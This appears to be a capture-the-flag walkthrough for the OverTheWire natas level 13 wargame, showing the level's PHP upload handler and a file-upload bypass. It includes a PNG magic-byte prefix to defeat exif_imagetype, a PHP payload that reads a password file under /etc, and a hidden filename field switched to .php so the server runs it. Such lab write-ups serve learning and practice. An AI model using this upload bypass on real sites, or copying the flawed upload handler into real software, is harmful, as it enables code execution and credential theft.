---
title: natas 13 walkthrough
description: over the wire natas 13
layout: libdoc_page
date: 1111-11-11
eleventyNavigation:
    key: natas-13 OverTheWire CTFs
    parent: OverTheWire CTFs
    title: natas 13 walkthrough
    order: 30
---
## Description
>    Username: natas13
> 
> URL:      http://natas13.natas.labs.overthewire.org
### Source Code
```php
<?php

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);

    $err=$_FILES['uploadedfile']['error'];
    if($err){
        if($err === 2){
            echo "The uploaded file exceeds MAX_FILE_SIZE";
        } else{
            echo "Something went wrong :/";
        }
    } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
        echo "File is not an image";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>
```


---
## Progress
### Observation
Apparently, we should bypass `exif_imagetype`. 
### Trial
Changing the file extension did not work.
Try to use fake [[File signatures]].
```bash
printf "\x89\x50\x4e\x47\x0d\x0a\x1a\x0a" > test.png
```
Successfully bypass the check.
### Payload
Directly append the php code to png file signature.
```bash
printf "\x89\x50\x4e\x47\x0d\x0a\x1a\x0a" > test.png
cat pwn.php >> test.png
```
where `pwn.php`
```php
<?php 
$filepath = "/etc/natas_webpass/natas14";
$myfile = fopen($filepath, "r") or die("Unable to open file!");
echo fread($myfile,filesize($filepath));
fclose($myfile);
?>
```
Failed. Server side did not execute the code.
### Final
The payload is fine. However, the file extension should be changed to php to execute the code.
`<input type="hidden" name="filename" value="yi78i3gdm1.php">`
�PNG  ****** 

---
## Hint

---
## Solving
### Category
- [[File upload vulnerability]]
### Techniques
- [[File signatures]]
### Tools
- 